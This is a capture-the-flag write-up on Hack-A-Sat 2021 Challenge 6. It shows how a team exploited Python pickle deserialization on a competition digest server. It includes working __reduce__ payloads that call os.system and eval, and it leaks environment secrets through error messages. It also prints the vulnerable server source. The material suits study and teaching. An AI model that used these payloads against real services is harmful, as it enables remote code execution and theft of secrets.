# HACK-A-SAT 2021: Challenge 6

## Service discovery

A final challenge was released one hour and a half before the end of the 
competition:

> Challenge 6 is up! Additional ports are enabled on the API server, 1341-1348 and 1361-1368, corresponding to your team

Upon the connection to one of the API server (`10.0.<team #>1.100`) on port 
1347, no data is received. After sending some garbage, we identified very 
unique error messages:

```
svrdig: Digest failed: pickle data was truncated
svrdig: Digest failed: invalid load key, 'A'
```

These messages are enough to be put on track for a Python pickle 
vulnerability. [[1]](https://github.com/python/cpython/blob/f4c03484da59049eb62a9bf7777b963e2267d187/Modules/_pickle.c#L1229) [[2]](https://github.com/python/cpython/blob/f4c03484da59049eb62a9bf7777b963e2267d187/Modules/_pickle.c#L6955)

## Exploitation

The Python pickle serialization format is already quite famous and documented
among security enthusiasts. For instance, it supports deserializing instances 
and to control how they should be treated. For instance, the method 
`__reduce__()` can return a tuple to tell `pickle` how to create the instance, 
as [found in the official documentation](https://docs.python.org/3/library/pickle.html#object.__reduce__):

> A callable object that will be called to create the initial version of the 
> object.
> A tuple of arguments for the callable object. An empty tuple must be given if 
> the callable does not accept any argument.

The invocation of an arbitrary callable object with custom arguments is enough to
execute commands during the deserialization process:

```python
import os

import pickle 
import pickletools 

class A:
    def __reduce__(self):
        return os.system, ('sleep 5',)

pickled = pickle.dumps(A())
pickle.loads(pickled)
```

This behavior can also be confirmed with `pickletools`, the final payload uses 
the `REDUCE` opcode:

```
    0: \x80 PROTO      4
    2: \x95 FRAME      34
   11: \x8c SHORT_BINUNICODE 'posix'
   18: \x94 MEMOIZE    (as 0)
   19: \x8c SHORT_BINUNICODE 'system'
   27: \x94 MEMOIZE    (as 1)
   28: \x93 STACK_GLOBAL
   29: \x94 MEMOIZE    (as 2)
   30: \x8c SHORT_BINUNICODE 'sleep 5'
   39: \x94 MEMOIZE    (as 3)
   40: \x85 TUPLE1
   41: \x94 MEMOIZE    (as 4)
   42: R    REDUCE
   43: \x94 MEMOIZE    (as 5)
   44: .    STOP
highest protocol among opcodes = 4
```

Despite an error message (`svrdig: Digest failed: '...' object has no attribute 'run'`) 
we assumed that the payload was correctly deserialized and the 
`REDUCE` opcode processed and that something else was breaking later in the 
code.

We tried various payloads to confirm that the command was run on the remote 
host, without success. Time-based payloads (e.g. using `sleep`) were not very 
helpful because of network jitter, and we did not achieve to get obtain a 
reverse shell back to our host. 

We had to look for another communication channel and thought about the error 
message we saw earlier: by raising an exception during the deserialization 
process, we could exfiltrate data.

```python
class A:
    def __reduce__(self):
        return (eval, ("__import__(str(os.environ.keys()))",))
```

This command resulted in an interesting finding, an environment variable named
`FLAG`:

```
svrdig: Digest failed: No module named "['PATH', 'HOSTNAME', 'COSMOS_CTS_HOSTNAME', 'FLAG', 'SERVER_PORT', 'HOME', 'LC_CTYPE']"
```

Its value could subsequently be leaked with the same technique:

```python
class A:
    def __reduce__(self):
        return (eval, ("__import__(str(os.environ['FLAG']))",))
```

```
svrdig: Digest failed: No module named 'UpbTqde9'
```

As stated by the organizers, the score is based on flag submission every round: 
we automated both the exploitation and the submission until the end of the 
competition.

We also exfiltrated `digest_server.py` and `digest.py` to confirm our 
assumptions about the challenge after collecting the first flags:

```python
#!/usr/bin/python3

import pickle, socket, os
from digest import Digest

def init():
    HOST = "0.0.0.0"
    print(os.environ)
    DIGEST_PORT = int(os.environ['SERVER_PORT'])

    print(f"svrdig: Starting digest server at address {HOST} port {DIGEST_PORT}")

    digest_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    digest_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    digest_socket.bind((HOST, DIGEST_PORT))
    digest_socket.listen(1)

    while True:
        conn, addr = digest_socket.accept()

        data = conn.recv(2048)

        print(f"svrdig: Server got a digest object from addr {addr} of len {len(data)}")

        try:
            digest_obj = pickle.loads(data)
            print(f"svrdig: Digest object created: {digest_obj}")

            tlmoutput = digest_obj.run()

            print(f"svrdig: Output from Digest object: {tlmoutput}")

            conn.send(tlmoutput.encode())  #bytes(tlmoutput))

            conn.close()
        except Exception as e:
            conn.send(f"svrdig: Digest failed: {str(e)} Closing connection!".encode())
            conn.close()

init()
```

```python
import ballcosmos

# Define a digest object for collection of telemetry data
# Uses the COSMOS_CTS_HOSTNAME environment variable to connect to cosmos

class Digest:
    tlmentries = []

    def run(self):
        print(f"dig: Running Digest object with tlmentries={self.tlmentries}")

        # compiles a list of commands and runs them

        output = ""
        for t in self.tlmentries:
            output += ballcosmos.tlm(t)

        return output
```

## Conclusion

After some trial and error, we quickly identified the vulnerability and could 
exploit it against other teams. It took about 30 minutes to get our first flag, 
that we validated a little bit before the first-blood on this challenge was announced.

We haven't investigated the possibility to send commands to other team's Cosmos 
instances by deserializing `Digest` objects or direct connections.
